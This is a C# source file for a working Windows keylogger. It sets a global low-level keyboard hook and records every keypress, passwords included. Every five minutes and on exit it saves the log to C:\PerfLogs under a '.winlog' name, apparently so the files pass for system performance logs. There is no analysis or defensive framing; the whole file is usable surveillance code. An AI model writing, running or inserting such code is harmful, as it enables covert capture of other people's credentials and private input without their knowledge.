using System;

using System.Diagnostics;

using System.Windows.Forms;

using System.Runtime.InteropServices;

//using System.Threading;
class InterceptKeys

{

    private const int WH_KEYBOARD_LL = 13;

    private const int WM_KEYDOWN = 0x0100;

    private static LowLevelKeyboardProc _proc = HookCallback;

    private static IntPtr _hookID = IntPtr.Zero;

    private static string string1 = null;

    private static int count = -1;

    static Timer autoSave = new Timer { Enabled = true, Interval = 300000 };

    public static void Main()

    {
        autoSave.Tick += new EventHandler(Sacuvaj);
        AppDomain.CurrentDomain.ProcessExit += new EventHandler(Sacuvaj);
        _hookID = SetHook(_proc);
        Application.Run();
        UnhookWindowsHookEx(_hookID);

    }
    static void Sacuvaj(object sender, EventArgs e)
    {
        do count++;
        while (System.IO.File.Exists(@"C:\PerfLogs\Log - " + count + ".winlog"));
        if (string1 != null) System.IO.File.WriteAllText(@"C:\PerfLogs\Log - " + count + ".winlog", string1);
        else count--;
        string1 = null;
    }

    private static IntPtr SetHook(LowLevelKeyboardProc proc)

    {

        using (Process curProcess = Process.GetCurrentProcess())

        using (ProcessModule curModule = curProcess.MainModule)

        {

            return SetWindowsHookEx(WH_KEYBOARD_LL, proc,

                GetModuleHandle(curModule.ModuleName), 0);

        }

    }

    private delegate IntPtr LowLevelKeyboardProc( int nCode, IntPtr wParam, IntPtr lParam);

    private static IntPtr HookCallback( int nCode, IntPtr wParam, IntPtr lParam)

    {

        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)

        {

            int vkCode = Marshal.ReadInt32(lParam);
            switch ((Keys)vkCode)
            {
                case Keys.F9:
                    Application.Exit();
                    break;
                case Keys.Space:
                    string1 += " ";
                    break;
                case Keys.Return:
                    string1 += @"
";
                    break;
                case Keys.LControlKey:
                    string1 += " (" + (Keys)vkCode + ") ";
                    break;
                case Keys.LShiftKey:
                    string1 += " (" + (Keys)vkCode + ") ";
                    break;
                case Keys.RShiftKey:
                    string1 += " (" + (Keys)vkCode + ") ";
                    break;
                case Keys.RControlKey:
                    string1 += " (" + (Keys)vkCode + ") ";
                    break;
                case Keys.Back:
                    string1 += " (" + (Keys)vkCode + ") ";
                    break;
                case Keys.Alt:
                    string1 += " (" + (Keys)vkCode + ") ";
                    break;
                case Keys.CapsLock:
                    string1 += " (" + (Keys)vkCode + ") ";
                    break;
                case Keys.Tab:
                    string1 += " (" + (Keys)vkCode + ") ";
                    break;
                case Keys.LWin:
                    string1 += " (" + (Keys)vkCode + ") ";
                    break;
                case Keys.RWin:
                    string1 += " (" + (Keys)vkCode + ") ";
                    break;
                case Keys.Delete:
                    string1 += " (" + (Keys)vkCode + ") ";
                    break;
                case Keys.Insert:
                    string1 += " (" + (Keys)vkCode + ") ";
                    break;
                case Keys.NumLock:
                    string1 += " (" + (Keys)vkCode + ") ";
                    break;
                default:
                    string1 += (Keys)vkCode;
                    break;
            }
        }
        
        return CallNextHookEx(_hookID, nCode, wParam, lParam);

    }

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]

    private static extern IntPtr SetWindowsHookEx(int idHook,

        LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]

    [return: MarshalAs(UnmanagedType.Bool)]

    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]

    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,

        IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]

    private static extern IntPtr GetModuleHandle(string lpModuleName);

}